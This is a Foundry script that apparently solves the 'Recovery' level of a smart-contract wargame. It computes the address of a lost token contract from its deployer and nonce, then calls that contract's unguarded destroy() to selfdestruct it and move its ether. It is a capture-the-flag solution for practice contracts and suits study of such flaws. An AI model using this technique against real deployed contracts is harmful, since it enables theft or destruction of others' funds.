// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/17-Recovery/Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level17Solution is Script {
    Recovery _recoveryInstance = Recovery(0xe8CFD41f460355963C7AD3faAc263e74572f071b);

    function run() public{
        vm.startBroadcast();

        // calc the address of created contract
        address _tokenContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6), 
            bytes1(0x94), 
            address(0xe8CFD41f460355963C7AD3faAc263e74572f071b), 
            bytes1(0x01)
        )))));

        console.log("address : ", _tokenContractAddress);

        SimpleToken _tokenContract = SimpleToken(payable(_tokenContractAddress));
        _tokenContract.destroy(payable(0xe8CFD41f460355963C7AD3faAc263e74572f071b));

        console.log("balance : ", address(_recoveryInstance).balance);

        vm.stopBroadcast();
    }
}